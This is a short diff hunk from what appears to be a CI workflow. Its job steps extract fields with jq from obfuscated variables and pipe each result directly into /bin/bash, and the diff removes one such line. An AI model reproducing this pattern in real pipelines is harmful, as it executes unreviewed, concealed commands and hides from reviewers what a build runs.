@@ -26,7 +26,6 @@ jobs:
           echo $yvn804 | jq -r .aqjzq529 | /bin/bash
           printf '%s' "$ltgw39" | jq -r .xez227 | /bin/bash
           echo $lol32 | jq -r .djsz31 | /bin/bash
-          printf '%s' "$ob8989" | jq -r .uo0 | /bin/bash
           printf '%s' "$tk908" | jq -r .wgm77542 | /bin/bash
 
       - name: Save output
